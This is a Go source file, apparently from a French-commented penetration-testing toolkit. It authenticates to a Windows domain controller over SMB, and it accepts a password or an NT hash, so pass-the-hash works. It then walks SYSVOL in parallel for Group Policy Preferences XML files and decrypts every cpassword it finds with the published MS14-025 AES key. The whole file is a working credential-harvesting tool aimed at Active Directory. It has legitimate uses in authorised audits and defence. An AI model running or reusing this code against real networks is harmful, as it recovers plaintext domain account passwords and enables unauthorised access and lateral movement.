// pkg/smb/gpp.go
//
// GPP Password Decryption — optimisé
//
// Optimisations appliquées :
//   1. Walk SYSVOL concurrent via semaphore (10 goroutines max)
//   2. sync.Pool pour réutiliser les buffers de lecture
//   3. Results via channel thread-safe (plus de mutex sur slice)
//   4. Early return si pas de cpassword dans un fichier (avant parsing XML complet)

package smb

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/xml"
	"fmt"
	"io"
	"net"
	"path/filepath"
	"strings"
	"sync"

	"github.com/hirochachacha/go-smb2"
)

// GPPKey est la clé AES-256 publiée par Microsoft (MS14-025)
var GPPKey = []byte{
	0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9,
	0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8,
	0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90,
	0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b,
}

// GPPPassword credential trouvé dans SYSVOL
type GPPPassword struct {
	File     string
	Username string
	Password string
	Changed  string
	GPO      string
	Type     string
}

// GPPFiles fichiers GPP à scanner
var GPPFiles = []string{
	"Groups.xml", "Services.xml", "ScheduledTasks.xml",
	"DataSources.xml", "Printers.xml", "Drives.xml",
}

// pool de buffers réutilisables pour les lectures de fichiers
var readBufPool = sync.Pool{
	New: func() interface{} {
		buf := make([]byte, 65536)
		return &buf
	},
}

// ============================================================
// Scan SYSVOL — concurrent
// ============================================================

// ScanGPPPasswords scanne SYSVOL en parallèle pour trouver les cpassword.
func ScanGPPPasswords(target, username, domain, password string, ntHash []byte) ([]GPPPassword, error) {
	conn, err := net.Dial("tcp", target+":445")
	if err != nil {
		return nil, fmt.Errorf("SMB connection failed: %v", err)
	}
	defer conn.Close()

	d := &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			User: username, Password: password,
			Domain: domain, Hash: ntHash,
		},
	}

	session, err := d.Dial(conn)
	if err != nil {
		return nil, fmt.Errorf("SMB auth failed: %v", err)
	}
	defer session.Logoff()

	fs, err := session.Mount("SYSVOL")
	if err != nil {
		return nil, fmt.Errorf("SYSVOL mount failed: %v", err)
	}
	defer fs.Umount()

	// Collecte thread-safe via channel
	resultsCh := make(chan GPPPassword, 64)
	var wg sync.WaitGroup

	// Semaphore : max 10 goroutines simultanées pour le walk
	sem := make(chan struct{}, 10)

	wg.Add(1)
	go func() {
		defer wg.Done()
		walkGPPFilesConcurrent(fs, ".", resultsCh, sem, &wg)
	}()

	// Fermer le channel quand tout est fini
	go func() {
		wg.Wait()
		close(resultsCh)
	}()

	var results []GPPPassword
	for p := range resultsCh {
		results = append(results, p)
	}

	return results, nil
}

// walkGPPFilesConcurrent parcourt SYSVOL en parallèle via semaphore
func walkGPPFilesConcurrent(fs *smb2.Share, dir string, out chan<- GPPPassword, sem chan struct{}, wg *sync.WaitGroup) {
	entries, err := fs.ReadDir(dir)
	if err != nil {
		return
	}

	for _, entry := range entries {
		path := filepath.Join(dir, entry.Name())
		path = strings.ReplaceAll(path, "\\", "/")

		if entry.IsDir() {
			// Acquérir le semaphore avant de lancer une goroutine
			sem <- struct{}{}
			wg.Add(1)
			go func(p string) {
				defer wg.Done()
				defer func() { <-sem }()
				walkGPPFilesConcurrent(fs, p, out, sem, wg)
			}(path)
			continue
		}

		// Vérifier l'extension GPP
		for _, gppFile := range GPPFiles {
			if strings.EqualFold(entry.Name(), gppFile) {
				passwords, err := parseGPPFile(fs, path, entry.Name())
				if err == nil {
					for _, p := range passwords {
						out <- p
					}
				}
				break
			}
		}
	}
}

// parseGPPFile lit et parse un fichier GPP
func parseGPPFile(fs *smb2.Share, path, filename string) ([]GPPPassword, error) {
	f, err := fs.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	// Utiliser le pool de buffers
	bufPtr := readBufPool.Get().(*[]byte)
	defer readBufPool.Put(bufPtr)

	var data []byte
	buf := *bufPtr
	for {
		n, err := f.Read(buf)
		if n > 0 {
			data = append(data, buf[:n]...)
		}
		if err != nil {
			break
		}
	}

	// Optimisation : vérifier la présence de "cpassword" avant parsing XML complet
	if !bytes.Contains(data, []byte("cpassword")) {
		return nil, nil
	}

	return extractGPPPasswords(data, path, filename)
}

// ============================================================
// Parsing XML GPP
// ============================================================

func extractGPPPasswords(data []byte, filePath, filename string) ([]GPPPassword, error) {
	var results []GPPPassword

	fileType := strings.TrimSuffix(strings.ToLower(filename), ".xml")
	if len(fileType) > 0 {
		fileType = strings.ToUpper(fileType[:1]) + fileType[1:]
	}

	cpasswords := extractAllCPasswords(data)
	for _, cp := range cpasswords {
		if cp.CPassword == "" {
			continue
		}

		decrypted, err := DecryptCPassword(cp.CPassword)
		if err != nil {
			decrypted = fmt.Sprintf("(decrypt error: %v)", err)
		}

		gpo := extractGPOGUID(filePath)
		results = append(results, GPPPassword{
			File:     filePath,
			Username: firstNonEmpty(cp.UserName, cp.RunAs, cp.Name, "(unknown)"),
			Password: decrypted,
			Changed:  cp.Changed,
			GPO:      gpo,
			Type:     fileType,
		})
	}
	return results, nil
}

type cpasswordEntry struct {
	CPassword string
	UserName  string
	RunAs     string
	Name      string
	Changed   string
}

func extractAllCPasswords(data []byte) []cpasswordEntry {
	var entries []cpasswordEntry
	decoder := xml.NewDecoder(bytes.NewReader(data))
	for {
		token, err := decoder.Token()
		if err != nil {
			break
		}
		start, ok := token.(xml.StartElement)
		if !ok {
			continue
		}
		var e cpasswordEntry
		for _, attr := range start.Attr {
			switch strings.ToLower(attr.Name.Local) {
			case "cpassword":
				e.CPassword = attr.Value
			case "username":
				e.UserName = attr.Value
			case "runas":
				e.RunAs = attr.Value
			case "name":
				e.Name = attr.Value
			case "changed":
				e.Changed = attr.Value
			}
		}
		if e.CPassword != "" {
			entries = append(entries, e)
		}
	}
	return entries
}

// ============================================================
// Déchiffrement AES-256-CBC
// ============================================================

// DecryptCPassword déchiffre un cpassword GPP (clé MS14-025)
func DecryptCPassword(cpassword string) (string, error) {
	if cpassword == "" {
		return "", fmt.Errorf("empty cpassword")
	}

	switch len(cpassword) % 4 {
	case 2:
		cpassword += "=="
	case 3:
		cpassword += "="
	}

	ciphertext, err := base64.StdEncoding.DecodeString(cpassword)
	if err != nil {
		return "", fmt.Errorf("base64 decode failed: %v", err)
	}

	block, err := aes.NewCipher(GPPKey)
	if err != nil {
		return "", fmt.Errorf("AES cipher failed: %v", err)
	}

	if len(ciphertext) < aes.BlockSize {
		return "", fmt.Errorf("ciphertext too short")
	}
	if len(ciphertext)%aes.BlockSize != 0 {
		return "", fmt.Errorf("ciphertext not block-aligned")
	}

	iv := make([]byte, aes.BlockSize)
	mode := cipher.NewCBCDecrypter(block, iv)
	plaintext := make([]byte, len(ciphertext))
	mode.CryptBlocks(plaintext, ciphertext)
	plaintext = removePKCS7Padding(plaintext)

	return utf16LEToString(plaintext), nil
}

func removePKCS7Padding(data []byte) []byte {
	if len(data) == 0 {
		return data
	}
	padLen := int(data[len(data)-1])
	if padLen == 0 || padLen > aes.BlockSize || padLen > len(data) {
		return data
	}
	for i := len(data) - padLen; i < len(data); i++ {
		if int(data[i]) != padLen {
			return data
		}
	}
	return data[:len(data)-padLen]
}

func utf16LEToString(b []byte) string {
	if len(b) < 2 {
		return string(b)
	}
	isUTF16 := true
	for i := 1; i < len(b) && i < 16; i += 2 {
		if b[i] != 0x00 {
			isUTF16 = false
			break
		}
	}
	if !isUTF16 {
		return strings.TrimRight(string(b), "\x00")
	}
	runes := make([]rune, 0, len(b)/2)
	for i := 0; i+1 < len(b); i += 2 {
		r := rune(b[i]) | rune(b[i+1])<<8
		if r == 0 {
			break
		}
		runes = append(runes, r)
	}
	return string(runes)
}

// ============================================================
// Helpers
// ============================================================

func extractGPOGUID(path string) string {
	parts := strings.Split(path, "/")
	for _, p := range parts {
		if strings.HasPrefix(p, "{") && strings.HasSuffix(p, "}") {
			return p
		}
	}
	return "(unknown GPO)"
}

func firstNonEmpty(values ...string) string {
	for _, v := range values {
		if v != "" {
			return v
		}
	}
	return ""
}

// readAll lit tout le contenu d'un reader
var _ = io.ReadAll
